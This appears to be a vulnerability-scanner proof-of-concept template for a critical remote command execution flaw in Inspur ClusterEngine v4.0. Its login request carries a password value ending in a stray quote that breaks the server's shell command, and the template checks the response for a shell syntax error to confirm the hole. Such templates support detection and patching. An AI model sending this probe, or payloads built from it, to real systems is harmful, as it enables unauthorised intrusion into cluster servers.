id: poc-yaml-inspur-clusterengine-rce
info:
  name: Inspur ClusterEngine v4.0 远程命令执行漏洞
  severity: critical
  tags:
  - rce
  finger: Inspur
  osprey-id: vb_2020_0039
requests:
- method: POST
  path: /login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: op=login&username=asd&password=asd'
  expression: 'contains(body, "{\"err\"") && contains(body, "syntax error: unexpected
    end of file")

    '
variables: {}
transport: http
